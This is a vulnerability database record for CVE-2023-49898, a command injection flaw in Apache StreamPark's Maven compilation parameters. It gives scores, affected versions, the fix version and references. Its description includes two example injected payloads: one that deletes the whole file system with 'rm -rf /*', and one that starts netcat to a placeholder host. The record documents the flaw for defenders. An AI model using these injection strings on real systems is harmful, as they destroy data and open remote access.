{"CVE Code": "CVE-2023-49898", "Description": "In streampark, there is a project module that integrates Maven's compilation capability. However, there is no check on the compilation parameters of Maven. allowing attackers to insert commands for remote command execution, The prerequisite for a successful attack is that the user needs to log in to the streampark system and have system-level permissions. Generally, only users of that system have the authorization to log in, and users would not manually input a dangerous operation command. Therefore, the risk level of this vulnerability is very low.\n\nMitigation:\n\nall users\u00a0should upgrade to 2.1.2\n\nExample:\n\n##You can customize the splicing method according to the compilation situation of the project, mvn compilation results use &&, compilation failure use \"||\" or \"&&\":\n\n/usr/share/java/maven-3/conf/settings.xml || rm -rf /*\n\n/usr/share/java/maven-3/conf/settings.xml && nohup nc x.x.x.x 8899 &", "NVD Link": "https://nvd.nist.gov/vuln/detail/CVE-2023-49898", "Vulnerability Categories": "N/A", "Affected Products": "\nApache\u00bbStreamparkVersions  from including (>=) 2.0.0andbefore (<) 2.1.2cpe:2.3:a:apache:streampark:*:*:*:*:*:*:*:*Matching versions", "EPSS Score": "0.07% Probability of exploitation activity in the next 30 days\n~ 28 % Percentile, the proportion of vulnerabilities that are scored at or less", "EPSS History": "\n #  Date  Old EPSS Score  New EPSS Score  Delta (New - Old) \n 1  2024-01-06  0.05%  0.07%  +0.02 ", "CVSS Scores": "7.2", "CWE": [{"CWE_ID": "CWE-77 Improper Neutralization of Special Elements used in a Command ('Command Injection')", "CWE_link": "/cwe-details/77/Improper-Neutralization-of-Special-Elements-used-in-a-Comman.html"}], "Reference": [{"ref_link": "https://lists.apache.org/thread/qj99c03r4td35f8gbxq084b8qmv2fyr3", "ref_desc": "CVE-2023-49898: Apache StreamPark (incubating): Authenticated system users could trigger remote command execution-Apache Mail ArchivesMailing List", "ref_cve_link": "N/A"}]}
